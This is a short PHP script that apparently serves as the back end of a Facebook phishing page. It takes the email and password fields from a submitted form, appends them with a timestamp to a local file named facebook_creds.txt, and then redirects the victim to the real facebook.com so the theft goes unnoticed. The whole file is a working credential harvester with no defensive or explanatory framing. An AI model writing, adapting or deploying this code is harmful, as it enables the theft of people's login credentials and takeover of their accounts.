<?php
date_default_timezone_set("UTC");

// Get POST data
$user = $_POST['email'] ?? 'unknown';
$pass = $_POST['pass'] ?? 'unknown';

// Prepare log line
$log = "Time: " . date("Y-m-d H:i:s") . " | User: $user | Pass: $pass\n";

// Write to site-specific file
file_put_contents("../../logs/facebook_creds.txt", $log, FILE_APPEND);

// Redirect back to legitimate-looking site or thank you page
header("Location: https://facebook.com");
exit();
?>